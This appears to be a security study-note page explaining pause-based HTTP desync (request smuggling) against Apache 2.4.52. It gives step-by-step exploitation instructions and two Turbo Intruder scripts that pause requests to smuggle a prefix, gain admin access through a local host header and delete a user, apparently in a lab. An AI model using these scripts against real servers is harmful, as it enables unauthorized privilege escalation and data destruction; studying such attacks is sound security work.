# Pause-based desync attacks

## Pause-Based Desync Vulnerabilities

In normal request-response workflow if server is never receive any data in given amount of time, it will usually treat it as complete and issues a response. This occurs usually when server is configured with a read timeout functionality. Vulnerablities arise when the timeout occurs but the connection is still alive.

## PSD on server-side

PSD techniques can be used to elicit CL.0 like behaviour. There are some pre-requisites for this.

* Front-end need to forward each byte to back-end without waiting to process full request
* Front-end cannot timeout before back-end timeout
* Back-end need to keep connection open after timeout

To exploit this vulnerability, follow these steps:

1. Send a request with a smuggled prefix in the body but pause before sending the body.
2. The back-end will wait for the body data as specified by the content-length header.
3. The back-end eventually times out.
4. The front-end continues forwarding the rest of the request, which is the body.
5. The back-end treats this as a fresh request since it already responded with a timeout earlier.

## POC using Burp - Turbo Intruder

Using Turbo Intruder we can effectively queue our requests and make it pause mid request and continue sending the rest of the payload.

{% hint style="info" %}
Apache 2.4.52 -> This version of apache is vulnerable to this kind of attacks. Example is referencing to this particular version
{% endhint %}

First discovery of and endpoint which server respond with a 302  redirect

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption><p>Server level redirect </p></figcaption></figure>

Using burp intruder, we can make use of the below script to pause mid request at around 60 seconds to wait for the backend to timeout but still keeping the connection open

```python
// def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)

```

Backend sends us two responses. The first is a normal request resulting in a 302 redirect. The second is our payload, which results in a 401 Unauthorized error because we are attempting to access the admin page which is only available to local user. We can confirm this is vulnerable to pause based desync.

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption><p>One request resulted in 2 responses, take note of the connection ID which is the same!</p></figcaption></figure>

Setting our host header to local user enables us to view the admin dashboard giving us elevated privilege as an admin.&#x20;

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption><p>Elevated Admin privilege</p></figcaption></figure>

Next, we craft our payload using burp intruder to exploit the privilege user delete function and successfully delete the user

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['Content-Length: 160\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

    
def handleResponse(req, interesting):
    table.add(req)
```

<div align="center">

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

</div>
